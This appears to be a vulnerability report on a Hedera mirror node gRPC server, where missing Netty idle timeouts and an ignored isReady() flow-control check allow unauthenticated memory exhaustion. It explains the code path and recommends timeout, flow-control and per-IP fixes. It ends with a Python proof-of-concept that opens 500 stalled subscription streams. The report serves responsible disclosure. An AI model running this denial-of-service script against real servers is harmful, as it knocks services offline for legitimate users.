### Title
Unbounded Netty Write Buffer Growth via Missing Idle Timeout and Absent `isReady()` Flow-Control Check Enables Unauthenticated Memory Exhaustion

### Summary
`GrpcConfiguration.grpcServerConfigurer()` configures the `NettyServerBuilder` with only `executor` and `maxConcurrentCallsPerConnection`, omitting any `maxConnectionIdle()`, `maxConnectionAge()`, or stream-level timeout. Combined with `ConsensusController.subscribeTopic()` calling `responseObserver::onNext` unconditionally without checking `ServerCallStreamObserver.isReady()`, an unauthenticated attacker can open many connections, subscribe to a high-traffic topic, and then stop reading, causing the server-side Netty write buffer to grow without bound until the JVM runs out of heap.

### Finding Description

**Code path 1 — missing timeouts:**
`GrpcConfiguration.grpcServerConfigurer()` (lines 27–35) is the sole customizer of the `NettyServerBuilder`. It sets only:
```java
serverBuilder.executor(applicationTaskExecutor);
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection()); // default 5
```
No call to `maxConnectionIdle()`, `maxConnectionAge()`, `keepAliveTimeout()`, or any equivalent is present. Connections are therefore never forcibly closed by the server regardless of how long they are idle or how long a stream has been open. [1](#0-0) [2](#0-1) 

**Code path 2 — no `isReady()` check:**
`ConsensusController.subscribeTopic()` wires the reactive pipeline directly to `responseObserver::onNext` via a plain `.subscribe()` call, which internally requests `Long.MAX_VALUE` from upstream:
```java
.subscribe(responseObserver::onNext, responseObserver::onError, responseObserver::onCompleted);
```
`responseObserver::onNext` in gRPC-Java is non-blocking — it enqueues the serialized frame into the Netty channel write buffer and returns immediately, regardless of whether the HTTP/2 flow-control window is exhausted or `isReady()` is `false`. The code never calls `serverCallStreamObserver.isReady()` before emitting. [3](#0-2) 

**Why `onBackpressureBuffer` does not help:**
`SharedTopicListener.listen()` applies `onBackpressureBuffer(maxBufferSize, BufferOverflowStrategy.ERROR)` (default 16 384 slots) between the shared hot flux and the per-subscriber pipeline. This buffer is designed to protect against a slow *reactive* subscriber. However, because `responseObserver::onNext` never blocks (it just appends to the Netty write buffer), the reactive pipeline always sees the downstream as infinitely fast. The backpressure buffer therefore never fills from the reactive pipeline's perspective, and the overflow/error path is never triggered. The actual unbounded accumulation happens in the Netty write buffer layer, which is invisible to Reactor. [4](#0-3) 

For the `POLL` listener type, there is no `onBackpressureBuffer` at all, making the situation worse. [5](#0-4) 

### Impact Explanation
An attacker who opens N connections (each carrying 5 streams, the per-connection maximum) and subscribes to a high-traffic topic on all streams, then stops reading, forces the server to accumulate serialized `ConsensusTopicResponse` frames in Netty write buffers for every stalled stream. With no idle timeout, these connections and their buffers persist indefinitely. On a busy topic the write buffer for a single stalled stream can grow at the rate of incoming topic messages × average message size. Across many connections this leads to heap exhaustion, `OutOfMemoryError`, and full service unavailability for all legitimate subscribers. No authentication or special privilege is required; the `subscribeTopic` RPC is publicly accessible.

### Likelihood Explanation
The attack requires only a standard gRPC client library (freely available), knowledge of a valid topic ID (observable from the public ledger), and the ability to open TCP connections to port 5600. Opening hundreds of connections from a single host or a small botnet is trivial. The attack is repeatable and can be sustained indefinitely because the server never closes idle connections. The default `maxConcurrentCallsPerConnection = 5` provides no meaningful protection since there is no limit on the number of connections from a single IP.

### Recommendation
1. **Add connection-level timeouts to `grpcServerConfigurer()`:**
   ```java
   serverBuilder.maxConnectionIdle(30, TimeUnit.SECONDS);
   serverBuilder.maxConnectionAge(300, TimeUnit.SECONDS);
   serverBuilder.maxConnectionAgeGrace(10, TimeUnit.SECONDS);
   serverBuilder.keepAliveTimeout(20, TimeUnit.SECONDS);
   ```
   Expose these as configurable properties in `NettyProperties`.

2. **Honour gRPC flow control in `ConsensusController.subscribeTopic()`:** Replace the plain `.subscribe()` with a `ServerCallStreamObserver`-aware subscription that pauses the reactive upstream when `isReady()` is `false` and resumes via `setOnReadyHandler()`. This prevents the Netty write buffer from growing beyond the HTTP/2 flow-control window.

3. **Add a per-IP connection limit** at the infrastructure or Netty `ChannelHandler` level to bound the total number of connections an unauthenticated client can hold.

### Proof of Concept
```python
import grpc
import threading
from hedera.mirror.api.proto import consensus_service_pb2_grpc
from hedera.mirror.api.proto import consensus_service_pb2
from hederahashgraph.api.proto.java import basic_types_pb2

TARGET = "mirror-node-grpc:5600"
TOPIC_NUM = 1234  # any active high-traffic topic

def open_stalled_stream():
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    req = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=TOPIC_NUM),
        consensusStartTime=...  # epoch 0
    )
    # Obtain the iterator but never call next() on it
    iterator = stub.subscribeTopic(req)
    # Block forever without reading — server buffers accumulate
    threading.Event().wait()

threads = [threading.Thread(target=open_stalled_stream) for _ in range(500)]
for t in threads:
    t.start()
# Server-side Netty write buffers grow unboundedly; JVM OOM follows
```

Steps:
1. Start 500+ threads, each opening a separate TCP connection and issuing `subscribeTopic` without ever calling `next()` on the response iterator.
2. Monitor server heap via JMX or `/actuator/metrics`; observe continuous growth in `netty.allocator.memory.used`.
3. With no `maxConnectionIdle` configured, connections remain open indefinitely.
4. Server eventually throws `OutOfMemoryError` and becomes unresponsive to legitimate clients.
